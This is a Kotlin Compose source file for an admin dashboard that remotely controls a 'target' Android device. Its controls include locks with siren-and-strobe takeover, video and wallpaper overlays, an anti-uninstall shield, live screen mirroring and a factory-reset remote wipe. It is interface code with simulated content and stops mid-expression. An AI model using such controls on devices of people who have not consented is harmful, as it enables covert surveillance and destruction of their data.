package com.example.ui.screens

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.FastOutSlowInEasing
import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Alarm
import androidx.compose.material.icons.filled.Bluetooth
import androidx.compose.material.icons.filled.Call
import androidx.compose.material.icons.filled.CallEnd
import androidx.compose.material.icons.filled.Cameraswitch
import androidx.compose.material.icons.filled.CloudDone
import androidx.compose.material.icons.filled.DeleteForever
import androidx.compose.material.icons.filled.FlashlightOn
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Mic
import androidx.compose.material.icons.filled.MicOff
import androidx.compose.material.icons.filled.Nightlight
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.PhoneAndroid
import androidx.compose.material.icons.filled.PhotoSizeSelectActual
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.PowerSettingsNew
import androidx.compose.material.icons.filled.Public
import androidx.compose.material.icons.filled.RestartAlt
import androidx.compose.material.icons.filled.Sensors
import androidx.compose.material.icons.filled.SettingsCell
import androidx.compose.material.icons.filled.SignalCellularAlt
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material.icons.filled.Upload
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material.icons.filled.Vibration
import androidx.compose.material.icons.filled.Videocam
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Divider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.example.data.model.AppRole
import com.example.data.model.CallStatus
import com.example.data.model.ControlTab
import com.example.data.model.DeviceState
import com.example.ui.components.AntiUninstallShieldCard
import com.example.ui.components.CyberCard
import com.example.ui.components.CyberHeader
import com.example.ui.components.CyberSwitch
import com.example.ui.components.CyberTabRow
import com.example.ui.theme.CyberAmber
import com.example.ui.theme.CyberBackground
import com.example.ui.theme.CyberBorder
import com.example.ui.theme.CyberBorderBright
import com.example.ui.theme.CyberCardBg
import com.example.ui.theme.CyberCardBgHover
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberCyanGlow
import com.example.ui.theme.CyberGreen
import com.example.ui.theme.CyberGreenGlow
import com.example.ui.theme.CyberRed
import com.example.ui.theme.CyberRedContainer
import com.example.ui.theme.CyberRedGlow
import com.example.ui.theme.CyberSurface
import com.example.ui.theme.TextMuted
import com.example.ui.theme.TextPrimary
import com.example.ui.theme.TextSecondary
import com.example.ui.theme.TextTertiary
import com.example.ui.viewmodel.ControlViewModel

@Composable
fun AdminDashboardScreen(
    viewModel: ControlViewModel,
    deviceState: DeviceState,
    selectedTab: ControlTab,
    onTabSelected: (ControlTab) -> Unit,
    modifier: Modifier = Modifier
) {
    var showGithubDialog by remember { mutableStateOf(false) }
    var showWipeConfirmDialog by remember { mutableStateOf(false) }

    Column(
        modifier = modifier
            .fillMaxSize()
            .background(CyberBackground)
    ) {
        // Header
        CyberHeader(
            currentRole = AppRole.ADMIN_CONSOLE,
            onToggleRole = { viewModel.toggleRole() },
            onOpenInfo = { showGithubDialog = true }
        )

        // Top Anti-Uninstall Shield Card
        Box(modifier = Modifier.padding(horizontal = 16.dp, vertical = 6.dp)) {
            AntiUninstallShieldCard(
                isEnabled = deviceState.antiUninstallEnabled,
                onToggle = { viewModel.toggleAntiUninstall() }
            )
        }

        // Tab Navigation
        CyberTabRow(
            selectedTab = selectedTab,
            onTabSelected = onTabSelected,
            modifier = Modifier.padding(vertical = 4.dp)
        )

        // Tab Content
        LazyColumn(
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f)
                .padding(horizontal = 16.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            when (selectedTab) {
                ControlTab.CONTROL -> {
                    item { ControlTabSection(viewModel, deviceState) }
                }
                ControlTab.LIVE -> {
                    item { LiveTabSection(viewModel, deviceState) }
                }
                ControlTab.MANAGE -> {
                    item { ManageTabSection(viewModel, deviceState, onConfirmWipe = { showWipeConfirmDialog = true }) }
                }
                ControlTab.TELEMETRY -> {
                    item { TelemetryTabSection(viewModel, deviceState) }
                }
                ControlTab.CALL -> {
                    item { PhoneCallTabSection(viewModel, deviceState) }
                }
            }

            // Live Activity Log stream at bottom of every tab
            item {
                ActivityLogFooter(viewModel)
            }

            item {
                Spacer(modifier = Modifier.height(24.dp))
            }
        }
    }

    if (showGithubDialog) {
        GitHubExportDialog(onDismiss = { showGithubDialog = false })
    }

    if (showWipeConfirmDialog) {
        AlertDialog(
            onDismissRequest = { showWipeConfirmDialog = false },
            title = {
                Text(
                    text = "CONFIRM REMOTE WIPE",
                    color = CyberRed,
                    fontWeight = FontWeight.Bold,
                    fontFamily = FontFamily.Monospace
                )
            },
            text = {
                Text(
                    text = "This will initiate a factory reset command on target device ${deviceState.deviceId}. All local data will be erased permanently.",
                    color = TextPrimary
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        viewModel.triggerWipeData()
                        showWipeConfirmDialog = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = CyberRed)
                ) {
                    Text("ERASE TARGET DEVICE", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showWipeConfirmDialog = false }) {
                    Text("CANCEL", color = TextSecondary)
                }
            },
            containerColor = CyberSurface
        )
    }
}

// -------------------------------------------------------------
// CONTROL TAB
// -------------------------------------------------------------
@Composable
private fun ControlTabSection(
    viewModel: ControlViewModel,
    deviceState: DeviceState
) {
    var videoInputUrl by remember { mutableStateOf(deviceState.videoUrl) }
    var showVideoDialog by remember { mutableStateOf(false) }
    var showWallpaperDialog by remember { mutableStateOf(false) }
    var showLockMessageEditor by remember { mutableStateOf(false) }
    var customLockMessage by remember { mutableStateOf(deviceState.lockV2AdminMessage) }

    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        // 1. FLASHLIGHT
        CyberControlCard(
            title = "Flashlight",
            statusText = if (deviceState.flashlightOn) "POWER ON • BEAM ACTIVE" else "STANDBY",
            statusActive = deviceState.flashlightOn,
            icon = Icons.Default.FlashlightOn,
            iconColor = if (deviceState.flashlightOn) CyberAmber else CyberCyan,
            isChecked = deviceState.flashlightOn,
            onCheckedChange = { viewModel.toggleFlashlight() },
            testTag = "switch_flashlight"
        )

        // 2. PLAY VIDEO
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, if (deviceState.videoPlaying) CyberCyan else CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(14.dp),
                            color = CyberCyan.copy(alpha = 0.12f),
                            border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.35f)),
                            modifier = Modifier.size(46.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.PlayArrow,
                                    contentDescription = "Play Video",
                                    tint = CyberCyan,
                                    modifier = Modifier.size(24.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column {
                            Text(
                                text = "Play Video",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary,
                                fontFamily = FontFamily.Monospace
                            )
                            Text(
                                text = if (deviceState.videoPlaying) "STREAMING OVERLAY" else "STANDBY",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = if (deviceState.videoPlaying) CyberCyan else TextTertiary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    CyberSwitch(
                        checked = deviceState.videoPlaying,
                        onCheckedChange = { viewModel.toggleVideoPlayback() },
                        activeColor = CyberCyan,
                        testTag = "switch_play_video"
                    )
                }

                Spacer(modifier = Modifier.height(12.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    OutlinedButton(
                        onClick = { showVideoDialog = true },
                        shape = RoundedCornerShape(12.dp),
                        border = BorderStroke(1.dp, CyberBorderBright),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text(
                            text = "CONFIGURE URL / PRESETS",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = CyberCyan,
                            fontFamily = FontFamily.Monospace
                        )
                    }

                    if (deviceState.videoPlaying) {
                        Button(
                            onClick = { viewModel.toggleVideoPlayback() },
                            colors = ButtonDefaults.buttonColors(containerColor = CyberRed),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Icon(Icons.Default.Stop, contentDescription = "Stop", tint = TextPrimary)
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("STOP", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }

        // 3. SET WALLPAPER
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Surface(
                        shape = RoundedCornerShape(14.dp),
                        color = CyberCyan.copy(alpha = 0.12f),
                        border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.35f)),
                        modifier = Modifier.size(46.dp)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Icon(
                                imageVector = Icons.Default.PhotoSizeSelectActual,
                                contentDescription = "Set Wallpaper",
                                tint = CyberCyan,
                                modifier = Modifier.size(24.dp)
                            )
                        }
                    }
                    Spacer(modifier = Modifier.width(14.dp))
                    Column {
                        Text(
                            text = "Set Wallpaper",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold,
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = deviceState.wallpaperName,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.SemiBold,
                            color = CyberCyan,
                            maxLines = 1,
                            overflow = TextOverflow.Ellipsis,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }

                Button(
                    onClick = { showWallpaperDialog = true },
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = CyberSurface),
                    border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.5f)),
                    modifier = Modifier.testTag("btn_upload_wallpaper")
                ) {
                    Icon(Icons.Default.Upload, contentDescription = "Upload", tint = CyberCyan, modifier = Modifier.size(16.dp))
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = "UPLOAD",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = CyberCyan,
                        fontFamily = FontFamily.Monospace
                    )
                }
            }
        }

        // 4. LOCK DEVICE (V1)
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, if (deviceState.isLockedV1) CyberRed else CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(14.dp),
                            color = CyberRed.copy(alpha = 0.15f),
                            border = BorderStroke(1.dp, CyberRed.copy(alpha = 0.4f)),
                            modifier = Modifier.size(46.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.Lock,
                                    contentDescription = "Lock Device",
                                    tint = CyberRed,
                                    modifier = Modifier.size(24.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column {
                            Text(
                                text = "Lock Device",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary,
                                fontFamily = FontFamily.Monospace
                            )
                            Text(
                                text = if (deviceState.isLockedV1) {
                                    val mins = deviceState.lockV1RemainingSeconds / 60
                                    val secs = deviceState.lockV1RemainingSeconds % 60
                                    "LOCKED • %02d:%02d".format(mins, secs)
                                } else {
                                    "UNLOCKED"
                                },
                                fontSize = 11.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = if (deviceState.isLockedV1) CyberRed else TextTertiary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    CyberSwitch(
                        checked = deviceState.isLockedV1,
                        onCheckedChange = { viewModel.toggleLockV1() },
                        activeColor = CyberRed,
                        testTag = "switch_lock_v1"
                    )
                }

                Spacer(modifier = Modifier.height(12.dp))

                // Duration Selector
                Text(
                    text = "LOCK DURATION (MINUTES):",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = TextSecondary,
                    fontFamily = FontFamily.Monospace
                )
                Spacer(modifier = Modifier.height(6.dp))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    listOf(5, 15, 30, 60).forEach { mins ->
                        val isSelected = deviceState.lockV1DurationMinutes == mins
                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = if (isSelected) CyberRed.copy(alpha = 0.2f) else CyberSurface,
                            border = BorderStroke(1.dp, if (isSelected) CyberRed else CyberBorder),
                            modifier = Modifier
                                .weight(1f)
                                .clickable { viewModel.setLockV1Minutes(mins) }
                        ) {
                            Text(
                                text = "${mins}m",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = if (isSelected) CyberRed else TextSecondary,
                                textAlign = TextAlign.Center,
                                modifier = Modifier.padding(vertical = 8.dp),
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }
                }
            }
        }

        // 5. LOCK V2 (EMERGENCY ALARM SIREN & STROBE)
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberRedContainer),
            border = BorderStroke(1.5.dp, CyberRed),
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = 4.dp)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(14.dp),
                            color = CyberRed.copy(alpha = 0.25f),
                            border = BorderStroke(1.5.dp, CyberRed),
                            modifier = Modifier.size(48.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.Alarm,
                                    contentDescription = "Lock V2 Alarm",
                                    tint = CyberRed,
                                    modifier = Modifier.size(26.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Text(
                                    text = "Lock V2",
                                    fontSize = 17.sp,
                                    fontWeight = FontWeight.Black,
                                    color = CyberRed,
                                    fontFamily = FontFamily.Monospace
                                )
                                Spacer(modifier = Modifier.width(6.dp))
                                Surface(
                                    shape = RoundedCornerShape(4.dp),
                                    color = CyberRed,
                                    modifier = Modifier.padding(2.dp)
                                ) {
                                    Text(
                                        text = "EMERGENCY ALARM",
                                        fontSize = 8.sp,
                                        fontWeight = FontWeight.Black,
                                        color = TextPrimary,
                                        modifier = Modifier.padding(horizontal = 4.dp, vertical = 1.dp)
                                    )
                                }
                            }
                            Text(
                                text = if (deviceState.isLockedV2) {
                                    val mins = deviceState.lockV2RemainingSeconds / 60
                                    val secs = deviceState.lockV2RemainingSeconds % 60
                                    "🚨 SIREN & STROBE ACTIVE • %02d:%02d".format(mins, secs)
                                } else {
                                    "READY • HIGH PRIORITY TAKEOVER"
                                },
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold,
                                color = if (deviceState.isLockedV2) CyberRed else TextSecondary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    CyberSwitch(
                        checked = deviceState.isLockedV2,
                        onCheckedChange = { viewModel.toggleLockV2() },
                        activeColor = CyberRed,
                        testTag = "switch_lock_v2"
                    )
                }

                Spacer(modifier = Modifier.height(12.dp))

                // Features tags
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    FeatureBadge(label = "🔊 SIREN ALARM", active = true)
                    FeatureBadge(label = "⚡ STROBE FLASH", active = true)
                    FeatureBadge(label = "📳 VIBRATION", active = true)
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Lock V2 Duration
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    listOf(10, 30, 60, 120).forEach { mins ->
                        val isSelected = deviceState.lockV2DurationMinutes == mins
                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = if (isSelected) CyberRed.copy(alpha = 0.3f) else CyberSurface,
                            border = BorderStroke(1.dp, if (isSelected) CyberRed else CyberBorder),
                            modifier = Modifier
                                .weight(1f)
                                .clickable { viewModel.setLockV2Minutes(mins) }
                        ) {
                            Text(
                                text = "${mins}m",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = if (isSelected) CyberRed else TextSecondary,
                                textAlign = TextAlign.Center,
                                modifier = Modifier.padding(vertical = 6.dp),
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Admin Message Preview & Edit Button
                Surface(
                    shape = RoundedCornerShape(12.dp),
                    color = CyberSurface,
                    border = BorderStroke(1.dp, CyberBorder),
                    modifier = Modifier
                        .fillMaxWidth()
                        .clickable { showLockMessageEditor = true }
                ) {
                    Row(
                        modifier = Modifier.padding(12.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "BROADCAST MESSAGE ON AGENT SCREEN:",
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold,
                                color = CyberCyan,
                                fontFamily = FontFamily.Monospace
                            )
                            Text(
                                text = "\"${deviceState.lockV2AdminMessage}\"",
                                fontSize = 12.sp,
                                color = TextPrimary,
                                maxLines = 2,
                                overflow = TextOverflow.Ellipsis
                            )
                        }
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "EDIT",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = CyberRed,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
            }
        }
    }

    // Video Config Dialog
    if (showVideoDialog) {
        AlertDialog(
            onDismissRequest = { showVideoDialog = false },
            title = {
                Text("CONFIGURE VIDEO OVERLAY", color = CyberCyan, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
                    Text("Enter custom YouTube or MP4 URL:", color = TextSecondary, fontSize = 12.sp)
                    OutlinedTextField(
                        value = videoInputUrl,
                        onValueChange = { videoInputUrl = it },
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = CyberCyan,
                            unfocusedBorderColor = CyberBorder,
                            focusedTextColor = TextPrimary,
                            unfocusedTextColor = TextPrimary
                        ),
                        modifier = Modifier.fillMaxWidth()
                    )

                    Text("Presets:", color = TextSecondary, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    listOf(
                        "Cyber Matrix Code" to "https://sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4",
                        "Security Warning" to "https://www.youtube.com/watch?v=security_alert_cyber",
                        "Rickroll Stream" to "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
                    ).forEach { (presetName, presetUrl) ->
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = CyberCardBg,
                            border = BorderStroke(1.dp, CyberBorder),
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    videoInputUrl = presetUrl
                                    viewModel.setVideoUrl(presetUrl, presetName)
                                }
                        ) {
                            Text(
                                text = presetName,
                                fontSize = 12.sp,
                                color = CyberCyan,
                                modifier = Modifier.padding(10.dp),
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        viewModel.setVideoUrl(videoInputUrl, "Custom Video Stream")
                        viewModel.toggleVideoPlayback(videoInputUrl, "Custom Video Stream")
                        showVideoDialog = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = CyberCyan)
                ) {
                    Text("LAUNCH ON AGENT SCREEN", color = CyberBackground, fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showVideoDialog = false }) {
                    Text("CANCEL", color = TextSecondary)
                }
            },
            containerColor = CyberSurface
        )
    }

    // Wallpaper Config Dialog
    if (showWallpaperDialog) {
        AlertDialog(
            onDismissRequest = { showWallpaperDialog = false },
            title = {
                Text("SET AGENT WALLPAPER", color = CyberCyan, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
                    Text("Select a cyber theme or upload image:", color = TextSecondary, fontSize = 12.sp)
                    listOf(
                        "Cyber Matrix Grid" to "https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=1080",
                        "Red Neon Cyberpunk" to "https://images.unsplash.com/photo-1578632767115-351597cf2477?w=1080",
                        "Dark Blue HUD Circuit" to "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1080",
                        "Crimson Skull Alert" to "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=1080"
                    ).forEach { (wpName, wpUrl) ->
                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = CyberCardBg,
                            border = BorderStroke(1.dp, CyberBorder),
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    viewModel.setWallpaper(wpUrl, wpName)
                                    showWallpaperDialog = false
                                }
                        ) {
                            Row(
                                modifier = Modifier.padding(12.dp),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(text = wpName, fontSize = 13.sp, color = TextPrimary, fontFamily = FontFamily.Monospace)
                                Text(text = "APPLY", fontSize = 11.sp, color = CyberCyan, fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { showWallpaperDialog = false }) {
                    Text("CLOSE", color = TextSecondary)
                }
            },
            containerColor = CyberSurface
        )
    }

    // Lock Message Editor
    if (showLockMessageEditor) {
        AlertDialog(
            onDismissRequest = { showLockMessageEditor = false },
            title = {
                Text("EDIT LOCK V2 MESSAGE", color = CyberRed, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Text("This message will appear prominently on the Agent device lock screen:", color = TextSecondary, fontSize = 12.sp)
                    OutlinedTextField(
                        value = customLockMessage,
                        onValueChange = { customLockMessage = it },
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = CyberRed,
                            unfocusedBorderColor = CyberBorder,
                            focusedTextColor = TextPrimary,
                            unfocusedTextColor = TextPrimary
                        ),
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        viewModel.setLockV2AdminMessage(customLockMessage)
                        showLockMessageEditor = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = CyberRed)
                ) {
                    Text("SAVE MESSAGE", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showLockMessageEditor = false }) {
                    Text("CANCEL", color = TextSecondary)
                }
            },
            containerColor = CyberSurface
        )
    }
}

// -------------------------------------------------------------
// LIVE TAB
// -------------------------------------------------------------
@Composable
private fun LiveTabSection(
    viewModel: ControlViewModel,
    deviceState: DeviceState
) {
    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
    val pulseAlpha by infiniteTransition.animateFloat(
        initialValue = 0.4f,
        targetValue = 1f,
        animationSpec = infiniteRepeatable(
            animation = tween(800, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "pulseAlpha"
    )

    Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
        // 1. LIVE SCREEN STREAM
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, if (deviceState.isLiveScreenActive) CyberCyan else CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(14.dp),
                            color = CyberCyan.copy(alpha = 0.12f),
                            border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.35f)),
                            modifier = Modifier.size(46.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.SettingsCell,
                                    contentDescription = "Live Screen",
                                    tint = CyberCyan,
                                    modifier = Modifier.size(24.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Text(
                                    text = "Live Screen Stream",
                                    fontSize = 16.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = TextPrimary,
                                    fontFamily = FontFamily.Monospace
                                )
                                if (deviceState.isLiveScreenActive) {
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Box(
                                        modifier = Modifier
                                            .size(8.dp)
                                            .background(CyberRed.copy(alpha = pulseAlpha), CircleShape)
                                    )
                                }
                            }
                            Text(
                                text = if (deviceState.isLiveScreenActive) "MIRRORING • 30 FPS • 1080x2400" else "STREAM STOPPED",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = if (deviceState.isLiveScreenActive) CyberCyan else TextTertiary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    CyberSwitch(
                        checked = deviceState.isLiveScreenActive,
                        onCheckedChange = { viewModel.toggleLiveScreen() },
                        activeColor = CyberCyan,
                        testTag = "switch_live_screen"
                    )
                }

                if (deviceState.isLiveScreenActive) {
                    Spacer(modifier = Modifier.height(12.dp))
                    // Screen Stream Canvas Box
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(200.dp)
                            .clip(RoundedCornerShape(14.dp))
                            .background(Color.Black)
                            .border(1.dp, CyberCyan.copy(alpha = 0.5f), RoundedCornerShape(14.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        // Simulated Target Screen Content
                        Column(
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.PhoneAndroid,
                                contentDescription = "Target Screen",
